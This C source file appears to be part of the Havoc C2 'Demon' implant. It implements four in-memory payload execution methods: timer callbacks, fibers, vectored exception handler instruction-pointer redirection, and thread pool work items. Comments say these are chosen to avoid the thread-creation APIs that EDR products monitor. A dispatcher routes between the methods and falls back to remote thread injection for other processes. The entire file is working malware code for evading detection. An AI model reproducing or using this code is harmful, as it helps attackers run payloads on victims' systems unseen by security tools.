#include <Demon.h>
#include <ntstatus.h>

#include <core/Win32.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Thread.h>
#include <common/Macros.h>
#include <common/Defines.h>

/*!
 * Thread Execution Techniques
 * 
 * Based on REALISTIC_THREAD_EXECUTION_ANALYSIS research
 * These methods avoid traditional thread creation APIs that EDRs monitor
 */

// Global payload address for exception handler
static PVOID g_PayloadAddress = NULL;

// Thread execution method definitions
#define THREAD_EXECUTE_CALLBACK     10
#define THREAD_EXECUTE_FIBER        11  
#define THREAD_EXECUTE_EXCEPTION    12
#define THREAD_EXECUTE_WORKITEM     13

/*!
 * 1. CALLBACK MECHANISM EXECUTION
 * Uses legitimate Windows timer callback infrastructure
 * No suspicious thread creation APIs
 */
NTSTATUS CallbackExecute( PVOID PayloadAddress, SIZE_T PayloadSize )
{
    HANDLE    TimerQueue = NULL;
    HANDLE    Timer = NULL;
    NTSTATUS  Status = STATUS_SUCCESS;
    
    PUTS( "[+] CallbackExecute: Using timer callback infrastructure" );
    
    // Create timer queue (legitimate Windows operation)
    TimerQueue = Instance->Win32.CreateTimerQueue();
    if ( !TimerQueue ) {
        PRINTF( "[-] Failed to create timer queue: %d", NtGetLastError() );
        return STATUS_UNSUCCESSFUL;
    }
    
    PUTS( "[+] Timer queue created successfully" );
    
    // Register timer callback - payload executes via callback
    if ( !Instance->Win32.CreateTimerQueueTimer( 
        &Timer,
        TimerQueue,
        (WAITORTIMERCALLBACK)PayloadAddress,  // Payload as callback
        NULL,                                 // Parameter
        100,                                  // Due time (ms)
        0,                                    // Period (one-shot)
        WT_EXECUTEONLYONCE 
    )) {
        PRINTF( "[-] Failed to create timer callback: %d", NtGetLastError() );
        Instance->Win32.DeleteTimerQueue( TimerQueue );
        return STATUS_UNSUCCESSFUL;
    }
    
    PUTS( "[+] Timer callback registered, executing payload via legitimate callback" );
    
    // Timer fires, executes payload via legitimate callback mechanism
    Instance->Win32.Sleep( 500 );  // Wait for execution
    
    PUTS( "[+] Payload execution completed" );
    
    // Cleanup
    Instance->Win32.DeleteTimerQueueTimer( TimerQueue, Timer, NULL );
    Instance->Win32.DeleteTimerQueue( TimerQueue );
    
    PUTS( "[+] Timer callback execution completed successfully" );
    return STATUS_SUCCESS;
}

/*!
 * 2. FIBER-BASED EXECUTION
 * Uses Windows Fiber API for cooperative threading
 * No thread creation APIs used
 */

typedef struct _FIBER_CONTEXT {
    PVOID PayloadAddress;
    PVOID OriginalFiber;
    BOOL  ExecutionComplete;
} FIBER_CONTEXT, *PFIBER_CONTEXT;

VOID WINAPI FiberPayloadProc( PVOID Parameter )
{
    PFIBER_CONTEXT FiberCtx = (PFIBER_CONTEXT)Parameter;
    
    PUTS( "[+] Executing payload in fiber context" );
    
    // Execute payload in fiber context
    ((VOID(*)())FiberCtx->PayloadAddress)();
    
    FiberCtx->ExecutionComplete = TRUE;
    
    PUTS( "[+] Payload execution completed, returning to original fiber" );
    
    // Return to original fiber
    Instance->Win32.SwitchToFiber( FiberCtx->OriginalFiber );
}

NTSTATUS FiberExecute( PVOID PayloadAddress )
{
    FIBER_CONTEXT FiberCtx = { 0 };
    PVOID         PayloadFiber = NULL;
    
    PUTS( "[+] FiberExecute: Using Windows Fiber API for execution" );
    
    // Convert current thread to fiber
    FiberCtx.OriginalFiber = Instance->Win32.ConvertThreadToFiberEx( NULL, FIBER_FLAG_FLOAT_SWITCH );
    if ( !FiberCtx.OriginalFiber ) {
        PRINTF( "[-] Failed to convert thread to fiber: %d", NtGetLastError() );
        return STATUS_UNSUCCESSFUL;
    }
    
    PUTS( "[+] Current thread converted to fiber" );
    
    FiberCtx.PayloadAddress = PayloadAddress;
    FiberCtx.ExecutionComplete = FALSE;
    
    // Create fiber for payload execution
    PayloadFiber = Instance->Win32.CreateFiberEx( 0, 0, FIBER_FLAG_FLOAT_SWITCH, FiberPayloadProc, &FiberCtx );
    if ( !PayloadFiber ) {
        PRINTF( "[-] Failed to create payload fiber: %d", NtGetLastError() );
        Instance->Win32.ConvertFiberToThread();
        return STATUS_UNSUCCESSFUL;
    }
    
    PUTS( "[+] Payload fiber created, switching to fiber execution" );
    
    // Execute payload via fiber switch (no new threads)
    Instance->Win32.SwitchToFiber( PayloadFiber );
    
    PUTS( "[+] Returned from payload fiber" );
    
    // Cleanup
    Instance->Win32.DeleteFiber( PayloadFiber );
    Instance->Win32.ConvertFiberToThread();
    
    PUTS( "[+] Fiber execution completed successfully" );
    return FiberCtx.ExecutionComplete ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

/*!
 * 3. EXCEPTION HANDLER EXECUTION (ADVANCED)
 * Payload executes via structured exception handling
 * Leverages legitimate exception processing
 */
LONG WINAPI ExceptionHandlerPayload( PEXCEPTION_POINTERS ExceptionInfo )
{
    PCONTEXT Context = ExceptionInfo->ContextRecord;
    
    PUTS( "[+] Exception handler triggered, redirecting execution to payload" );
    
    // Modify context to execute payload
#ifdef _WIN64
    PRINTF( "[+] Original RIP: %p, redirecting to: %p", C_PTR( Context->Rip ), g_PayloadAddress );
    Context->Rip = (DWORD64)g_PayloadAddress;
#else
    PRINTF( "[+] Original EIP: %p, redirecting to: %p", C_PTR( Context->Eip ), g_PayloadAddress );
    Context->Eip = (DWORD)g_PayloadAddress;
#endif
    
    return EXCEPTION_CONTINUE_EXECUTION;  // Continue with modified context
}

NTSTATUS ExceptionExecute( PVOID PayloadAddress )
{
    PVOID Handler = NULL;
    
    PUTS( "[+] ExceptionExecute: Using exception handler redirection" );
    
    g_PayloadAddress = PayloadAddress;
    
    // Register custom exception handler
    Handler = Instance->Win32.AddVectoredExceptionHandler( 1, ExceptionHandlerPayload );
    if ( !Handler ) {
        PRINTF( "[-] Failed to register exception handler: %d", NtGetLastError() );
        return STATUS_UNSUCCESSFUL;
    }
    
    PUTS( "[+] Vectored exception handler registered" );
    
    // Trigger exception to invoke handler (SEH alternative for cross-platform)
    PUTS( "[+] Triggering access violation to invoke handler" );
    volatile PULONG Trigger = (PULONG)0x1;
    *Trigger = 0x42;  // This will trigger the vectored exception handler
    
    Instance->Win32.RemoveVectoredExceptionHandler( Handler );
    
    PUTS( "[+] Exception handler execution completed successfully" );
    return STATUS_SUCCESS;
}

/*!
 * 4. WORK ITEM EXECUTION
 * Execute via Windows thread pool work items
 * Integrates with legitimate Windows task scheduling
 */

typedef struct _WORK_ITEM_CONTEXT {
    PTP_WORK     WorkItem;
    PVOID        PayloadAddress;
    volatile BOOL ExecutionComplete;
} WORK_ITEM_CONTEXT, *PWORK_ITEM_CONTEXT;

VOID CALLBACK WorkItemPayload( 
    PTP_CALLBACK_INSTANCE Instance,
    PVOID                 Context,
    PTP_WORK             Work 
) {
    PWORK_ITEM_CONTEXT WorkCtx = (PWORK_ITEM_CONTEXT)Context;
    
    PUTS( "[+] Work item callback executing payload" );
    
    // Execute payload in work item context
    ((VOID(*)())WorkCtx->PayloadAddress)();
    
    WorkCtx->ExecutionComplete = TRUE;
    
    PUTS( "[+] Work item payload execution completed" );
}

NTSTATUS WorkItemExecute( PVOID PayloadAddress )
{
    WORK_ITEM_CONTEXT WorkCtx = { 0 };
    
    PUTS( "[+] WorkItemExecute: Using Windows thread pool work items" );
    
    WorkCtx.PayloadAddress = PayloadAddress;
    WorkCtx.ExecutionComplete = FALSE;
    
    // Create work item in thread pool
    WorkCtx.WorkItem = Instance->Win32.CreateThreadpoolWork( WorkItemPayload, &WorkCtx, NULL );
    if ( !WorkCtx.WorkItem ) {
        PRINTF( "[-] Failed to create threadpool work item: %d", NtGetLastError() );
        return STATUS_UNSUCCESSFUL;
    }
    
    PUTS( "[+] Thread pool work item created" );
    
    // Submit work item for execution
    Instance->Win32.SubmitThreadpoolWork( WorkCtx.WorkItem );
    
    PUTS( "[+] Work item submitted to thread pool" );
    
    // Wait for completion
    Instance->Win32.WaitForThreadpoolWorkCallbacks( WorkCtx.WorkItem, FALSE );
    
    PUTS( "[+] Work item execution completed" );
    
    // Cleanup
    Instance->Win32.CloseThreadpoolWork( WorkCtx.WorkItem );
    
    PUTS( "[+] Work item execution completed successfully" );
    return WorkCtx.ExecutionComplete ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

/*!
 * Thread execution dispatcher
 * Routes to appropriate execution method based on configuration
 */
HANDLE ThreadCreateProfessional(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  BOOL   x64,
    IN  PVOID  Entry,
    IN  PVOID  Arg,
    OUT PDWORD ThreadId
) {
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    
    PRINTF( "[+] ThreadCreateProfessional: Using execution method %d\n", Method );
    
    // If targeting remote process, fall back to injection methods
    if ( Process != NtCurrentProcess() ) {
        PUTS( "[!] Remote process execution, falling back to injection methods" );
        return ThreadCreate( THREAD_METHOD_NTCREATETHREADEX, Process, x64, Entry, Arg, ThreadId );
    }
    
    // Dispatch to selected method
    switch ( Method ) {
        case THREAD_EXECUTE_CALLBACK:
            PUTS( "[+] Using timer callback execution" );
            Status = CallbackExecute( Entry, 0 );
            break;
            
        case THREAD_EXECUTE_FIBER:
            PUTS( "[+] Using fiber-based execution" );
            Status = FiberExecute( Entry );
            break;
            
        case THREAD_EXECUTE_EXCEPTION:
            PUTS( "[+] Using exception handler execution (ADVANCED)" );
            Status = ExceptionExecute( Entry );
            break;
            
        case THREAD_EXECUTE_WORKITEM:
            PUTS( "[+] Using work item execution" );
            Status = WorkItemExecute( Entry );
            break;
            
        default:
            PUTS( "[+] Using default timer callback execution" );
            Status = CallbackExecute( Entry, 0 );
            break;
    }
    
    // Return fake thread handle for compatibility
    if ( NT_SUCCESS( Status ) ) {
        if ( ThreadId ) *ThreadId = Instance->Win32.GetCurrentThreadId();
        return NtCurrentThread();
    }
    
    return NULL;
}
